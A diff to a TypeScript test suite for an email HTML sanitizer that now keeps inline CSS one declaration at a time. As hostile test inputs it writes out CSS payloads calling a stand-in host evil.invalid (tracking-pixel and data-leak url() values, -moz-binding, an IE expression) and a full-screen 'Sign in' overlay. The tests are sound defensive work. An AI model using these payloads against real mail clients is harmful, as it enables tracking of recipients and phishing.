@@ -190,8 +190,82 @@ describe("remote content", () => {
   });
 });
 
+/**
+ * Inline CSS is allowed, one declaration at a time.
+ *
+ * The earlier rule was simpler - drop every style attribute - and it cost the
+ * whole visual fidelity of an automation message, whose formatting lives in
+ * nothing else. The draft screen made that untenable: a pane labelled "how the
+ * recipient sees it" showed a white table where the recipient sees a grey
+ * header row. So the allowlist moved down a level, from the attribute to the
+ * declarations inside it.
+ *
+ * These tests are the boundary. Every property that could fetch a URL or
+ * position an element must stay out, and no accepted value may be able to
+ * spell `url(`.
+ */
+describe("inline CSS that is kept", () => {
+  const cases: Array<[string, string, string]> = [
+    ["the grey header row", '<tr style="background-color:rgb(242,242,242)"><td>x</td></tr>', "background-color:rgb(242,242,242)"],
+    ["Calibri 11pt", '<div style="font-family:Calibri,Arial,sans-serif;font-size:11pt">x</div>', "font-family:Calibri,Arial,sans-serif"],
+    ["table borders", '<table style="border-collapse:collapse;border-spacing:0px">x</table>', "border-collapse:collapse"],
+    ["cell borders and padding", '<td style="border:1px solid #d0d0d0;padding:6px 8px">x</td>', "border:1px solid #d0d0d0"],
+    ["text colour and alignment", '<p style="color:#333333;text-align:center">x</p>', "color:#333333"],
+    // Measured against a real draft. Outlook's own default stack contains
+    // underscores, and a pattern that rejected them dropped the font from
+    // every paragraph of the message.
+    [
+      "Outlook's default font stack",
+      '<p style="font-family:aptos,aptos_embeddedfont,aptos_msfontservice,calibri,sans-serif">x</p>',
+      "aptos_embeddedfont",
+    ],
+    ["direction", '<div style="direction:ltr">x</div>', "direction:ltr"],
+    ["box-sizing", '<table style="box-sizing:border-box">x</table>', "box-sizing:border-box"],
+  ];
+
+  it.each(cases)("keeps %s", (_label, input, expected) => {
+    expect(clean(input)).toContain(expected);
+  });
+});
+
 describe("style-based attacks", () => {
-  it("strips a style attribute entirely", () => {
+  it("drops a url() while keeping the harmless declaration beside it", () => {
+    // The granularity is the point. A hostile declaration does not poison the
+    // whole attribute, and a legitimate one does not smuggle it through.
+    const output = clean(
+      '<div style="color:red;background-image:url(https://evil.invalid/leak?data=x)">text</div>',
+    );
+
+    expect(output).toContain("color:red");
+    expect(output).not.toContain("url(");
+    expect(output).not.toContain("evil.invalid");
+    expect(output).toContain("text");
+  });
+
+  it.each([
+    ["background-image", 'background-image:url(https://evil.invalid/p.gif)'],
+    ["the background shorthand", 'background:url(https://evil.invalid/p.gif)'],
+    ["a url() in a colour", 'background-color:url(https://evil.invalid/p.gif)'],
+    ["a url() in a font stack", 'font-family:url(https://evil.invalid/f.woff)'],
+    ["cursor", 'cursor:url(https://evil.invalid/c.cur),auto'],
+    ["content", 'content:url(https://evil.invalid/a)'],
+    ["list-style-image", 'list-style-image:url(https://evil.invalid/b)'],
+    ["-moz-binding", '-moz-binding:url(https://evil.invalid/x.xml)'],
+    ["behavior", 'behavior:url(#default#time2)'],
+    ["an IE expression", 'width:expression(alert(1))'],
+  ])("gives CSS no way to reach the network via %s", (_label, declaration) => {
+    // Every one of these is a read receipt at best: a fetch that tells the
+    // sender the message was opened, which is exactly what blocking remote
+    // images exists to prevent.
+    const output = clean(`<div style="${declaration}">text</div>`);
+
+    expect(output).not.toContain("url(");
+    expect(output).not.toContain("evil.invalid");
+    expect(output).not.toContain("expression");
+    expect(output).toContain("text");
+  });
+
+  it("strips a style attribute with nothing allowable in it", () => {
     const output = clean(
       '<div style="background-image:url(https://evil.invalid/leak?data=x)">text</div>',
     );
@@ -215,7 +289,24 @@ describe("style-based attacks", () => {
       '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">Sign in</div>',
     );
 
-    expect(output).not.toContain("position:fixed");
+    expect(output).not.toContain("position");
+    expect(output).not.toContain("z-index");
+    // Viewport units are how an overlay covers the screen, so no length that
+    // scales with the viewport is accepted either.
+    expect(output).not.toContain("100vw");
+    expect(output).not.toContain("100vh");
+  });
+
+  it("keeps a <style> element out even though attributes are now allowed", () => {
+    // The distinction that makes the allowlist safe: an attribute styles the
+    // one element carrying it, whereas a stylesheet carries selectors and can
+    // reach anything in the document.
+    const output = expectNeutralised(
+      "<style>td{background-image:url(https://evil.invalid/p)}</style><td>x</td>",
+    );
+
+    expect(output).not.toContain("evil.invalid");
+    expect(output).not.toContain("background-image");
   });
 
   it("strips class and id, which only matter with a stylesheet we do not allow", () => {
